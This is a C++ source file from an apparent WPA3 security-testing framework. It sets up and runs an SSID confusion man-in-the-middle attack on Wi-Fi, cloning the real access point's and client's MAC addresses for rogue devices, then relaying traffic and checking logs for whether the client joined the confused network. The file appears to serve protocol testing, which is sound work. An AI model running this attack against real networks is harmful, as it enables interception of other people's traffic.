#include "attacks/mc_mitm/ssid_confusion/ssid_confusion_attack.h"

#include <fstream>
#include <nlohmann/json.hpp>
#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/mc_mitm_attack.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "config/RunStatus.h"
#include "logger/log_util.h"
#include "observer/dmesg_wrapper.h"
#include "system/hw_capabilities.h"
#include "system/utils.h"
#include "visual/result_helper.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {


// Copy supplicant config + EAP user file (if present); start WrongNet AP + client.
void setup_attack(RunStatus &rs) {
    const auto cfg_dir = rs.config_path().parent_path() / "config";
    for(const auto &f : {"SafeNet_WrongNet.conf", "hostapd.eap_user"}) {
        const auto src = cfg_dir / f;
        if(exists(src)) copy_f(src, rs.run_folder() / f);
    }

	components::client_ap_setup_t(rs); //TODO why this need to be before setup of fake MAC addresses?

	const auto rogue_ap = rs.get_actor("rogue_ap");
	rogue_ap->set_mac_address(rs.get_actor("ap").get(SK::permanent_mac));
	rogue_ap->set_iface_up();
    const auto rogue_client = rs.get_actor("rogue_client");
	rogue_client->set_mac_address(rs.get_actor("client").get(SK::mac));
    rogue_client->set_iface_up();
}

// Topology: WrongNet AP (ch 11) <-> rogue_client (ch 11) <-> rogue_ap (ch 1, fake SafeNet) <-> client
void run_attack(RunStatus &rs) {
    const auto rogue_ap     = rs.get_actor("rogue_ap");     // injects confused beacons, relays client
    const auto rogue_client = rs.get_actor("rogue_client"); // CSA injection, relays to wrong AP
    const auto ap           = rs.get_actor("ap");           // WrongNet AP
    const auto client       = rs.get_actor("client");

    const auto &att_cfg        = rs.config().at("attack_config");
    const string confused_ssid = att_cfg.at("confused_ssid");
    const int    beacon_ms     = att_cfg.at("beacon_interval_ms");

	SsidConfusion attack(rogue_client, rogue_ap, client, ap, rs.run_folder(), confused_ssid, beacon_ms);
	attack.run(rs, rs.config().at("attack_config").at("attack_time_sec").get<int>());
}

// return if wpa_supplicant connected to the confused SSID
static bool client_connected_to_confused(const RunStatus &rs, const string &confused_ssid,
                                          optional<TimeWindow> window) {
	const path clog = rs.run_folder() / "logger" / "client.log";
	string net_id;
	{ // resolve the wpa_supplicant network ID
		ifstream f(clog);
		const string needle = "ssid='" + confused_ssid + "'";
		for(string line; getline(f, line); ) {
			if(!line.contains(needle)) continue;
			const auto p = line.find("id=");
			if(p == string::npos) continue;
			size_t i = p + 3;
			while(i < line.size() && isdigit(line[i])) net_id += line[i++];
			if(!net_id.empty()) break;
		}
	}
	return !net_id.empty() &&
		!get_time_logs(rs, "client", "completed [id=" + net_id + " id_str=", window).empty();
}

void stats_attack(const RunStatus &rs) {
	mc_mitm::stats(rs);

	const string mac_str = rs.get_actor("client").get(SK::mac);
	const auto window = visual::helper::get_run_window(rs);
	const string confused_ssid = rs.config().at("attack_config").at("confused_ssid");

	const bool client_connected = client_connected_to_confused(rs, confused_ssid, window);

	const auto state_log = rs.run_folder() / "observer" / "client_state" / (mac_str + "_state.log");
	const bool got_mitm = !observer::dmesg::grep_log(state_log, "GotMitm", window).empty();

	nlohmann::json result{};
	result["client_connected"] = client_connected;
	result["got_mitm"] = got_mitm;
	rs.save_result(result);
}

}
